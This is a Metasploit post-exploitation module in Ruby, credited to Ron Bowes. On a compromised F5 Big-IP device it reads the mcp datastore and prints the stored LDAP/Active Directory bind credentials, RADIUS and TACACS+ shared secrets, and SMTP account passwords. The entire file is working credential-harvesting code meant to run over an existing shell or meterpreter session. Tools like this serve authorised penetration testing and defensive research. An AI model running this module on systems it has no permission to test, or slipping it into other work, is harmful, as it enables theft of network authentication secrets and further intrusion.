##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System
  include Msf::Post::Linux::F5

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'F5 Big-IP Gather Passwords',
      'Description'  => %q{
        This module gathers passwords from F5's mcp datastore, which is accessed
        via /var/run/mcp on F5 Big-IP (and similar) devices.

        To develop this module, I used tooling I wrote to dump *everything* from
        mcp, then used regexes to look through ~400,000 lines of output for
        anything that might store passwords.
      },
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          'Ron Bowes'
        ],
      'Platform'     => ['linux'],
      'SessionTypes' => ['shell', 'meterpreter']
    ))
  end

  def run
    results = []

    vprint_status("Trying to fetch LDAP / Active Directory configuration")
    ldap_config = mcp_simple_query('auth_ldap_config')
    if ldap_config.length > 0
      ldap_config.each do |config|
        if config['auth_ldap_config_bind_pw']
          results << "LDAP: #{config['auth_ldap_config_bind_dn']} / #{config['auth_ldap_config_bind_pw']} (server(s): #{config['auth_ldap_config_servers'].join(', ')})"
        end
      end
    else
      vprint_status("No LDAP / Active Directory password found")
    end

    vprint_status("Trying to fetch Radius configuration")
    radius_config = mcp_simple_query('radius_server')
    if radius_config.length > 0
      radius_config.each do |config|
        if config['radius_server_secret']
          results << "Radius secret: #{config['radius_server_secret']} (server: #{config['radius_server_server']})"
        end
      end
    else
      vprint_status("No Radius password found")
    end

    vprint_status("Trying to fetch TACACS+ configuration")
    tacacs_config = mcp_simple_query('auth_tacacs_config')
    if tacacs_config.length > 0
      tacacs_config.each do |config|
        if config['auth_tacacs_config_secret']
          results << "TACACS+ secret: #{config['auth_tacacs_config_secret']} (server(s): #{config['auth_tacacs_config_servers'].join(', ')})"
        end
      end
    else
      vprint_status("No TACACS+ password found")
    end

    vprint_status("Trying to fetch SMTP configuration")
    smtp_config = mcp_simple_query('smtp_config')
    if smtp_config.length > 0
      smtp_config.each do |config|
        if config['smtp_config_username']
          results << "SMTP account: #{config['smtp_config_username']} / #{config['smtp_config_password']} (server(s): #{config['smtp_config_smtp_server_address']}:#{config['smtp_config_smtp_server_port']})"
        end
      end
    else
      vprint_status("No SMTP password found")
    end

    if results.empty?
      print_warning('No service passwords found')
    else
      results.each { |r| print_good(r) }
    end

  end

  # def save(msg, data, ctype = 'text/plain')
  #   ltype = 'linux.enum.users'
  #   loot = store_loot(ltype, ctype, session, data, nil, msg)
  #   print_good("#{msg} stored in #{loot.to_s}")
  # end

end
